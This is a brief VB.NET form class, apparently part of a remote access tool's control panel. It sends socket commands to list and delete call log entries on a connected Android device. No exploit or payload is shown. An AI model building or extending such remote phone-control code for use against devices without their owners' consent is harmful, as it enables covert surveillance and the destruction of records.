Public Class Android_calllog
    Public sock As Integer

    Private Sub DeleteThisLogToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteThisLogToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then
            Dim result As Integer = MessageBox.Show("This action will delete the selected call log" & vbNewLine & "Are you sure to Delete this call log from Android device ?", "Confirm Log Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then

                Dim callentry As String = ListView1.SelectedItems(0).Text
                'MsgBox(callentry)
                Form1.Server.Send_DX(sock, "calls_manager_delete" & SplitData & callentry & SplitData)

            End If


            ListView1.Items.Clear()
            Form1.Server.Send_DX(sock, "calls_manager")
        End If
     
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "calls_manager")

    End Sub
End Class